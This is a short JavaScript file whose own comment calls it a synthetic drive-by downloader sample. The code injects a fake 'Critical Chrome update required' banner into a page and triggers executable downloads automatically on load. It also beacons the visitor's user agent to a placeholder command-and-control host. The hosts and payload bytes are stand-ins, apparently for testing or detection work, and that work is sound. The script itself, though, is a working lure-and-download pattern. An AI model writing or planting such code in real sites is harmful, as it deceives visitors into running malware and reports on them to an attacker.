// DRIVEBY — synthetic drive-by downloader product sample.
(function () {
  var PAYLOAD = 'https://cdn.example.test/updates/chrome-update-131.exe';
  var C2 = 'https://c2.example.test/download';
  console.log('[DRIVEBY] fake update prompt');

  try {
    var banner = document.createElement('div');
    banner.id = 'update-banner';
    banner.innerHTML = '<h2>Critical Chrome update required</h2><button id="update-now">Update now</button>';
    document.body.appendChild(banner);
  } catch (error) {}

  function triggerDownload() {
    try {
      var link = document.createElement('a');
      link.href = PAYLOAD;
      link.download = 'chrome-update.exe';
      link.click();
    } catch (error) {}
    try {
      var blob = new Blob(['MZ-demo-payload'], { type: 'application/octet-stream' });
      var url = URL.createObjectURL(blob);
      var anchor = document.createElement('a');
      anchor.href = url;
      anchor.download = 'update.exe';
      anchor.click();
    } catch (error) {}
    try {
      fetch(C2, { method: 'POST', body: btoa(JSON.stringify({ payload: PAYLOAD, ua: navigator.userAgent })) }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('driveby:started', '1'); } catch (error) {}
    console.log('[DRIVEBY] download triggered');
  }

  try {
    var button = document.getElementById('update-now');
    if (button) button.addEventListener('click', triggerDownload);
  } catch (error) {}
  triggerDownload();
})();
